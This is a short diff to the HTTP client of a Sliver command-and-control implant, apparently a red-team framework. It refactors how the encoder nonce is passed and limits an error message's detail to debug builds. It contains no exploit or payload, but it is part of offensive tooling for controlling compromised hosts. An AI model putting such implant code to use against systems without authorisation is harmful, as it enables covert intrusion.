@@ -53,6 +53,7 @@ import (
 	"time"
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/encoders"
 	"github.com/bishopfox/sliver/sliver/proxy"
 	"github.com/golang/protobuf/proto"
 )
@@ -97,7 +98,7 @@ func (s *SliverHTTPClient) SessionInit() error {
 		// {{if .Debug}}
 		log.Printf("Invalid public key")
 		// {{end}}
-		return errors.New("error")
+		return errors.New("{{if .Debug}}Invalid public key{{end}}")
 	}
 	sKey := RandomAESKey()
 	s.SessionKey = &sKey
@@ -117,13 +118,11 @@ func (s *SliverHTTPClient) SessionInit() error {
 	return nil
 }
 
-func (s *SliverHTTPClient) newHTTPRequest(method, uri string, encoderNonce *int, body io.Reader) *http.Request {
+func (s *SliverHTTPClient) newHTTPRequest(method, uri string, encoderNonce int, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri, body)
 	req.Header.Set("User-Agent", defaultUserAgent)
 	req.Header.Set("Accept-Language", "en-US")
-	if encoderNonce != nil {
-		req.URL.Query().Add("_", fmt.Sprintf("%d", encoderNonce))
-	}
+	req.URL.Query().Add("_", fmt.Sprintf("%d", encoderNonce))
 	return req
 }
 
@@ -132,7 +131,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	// {{if .Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	req := s.newHTTPRequest(http.MethodGet, uri, nil, nil)
+	req := s.newHTTPRequest(http.MethodGet, uri, encoders.NopNonce(), nil)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Debug}}
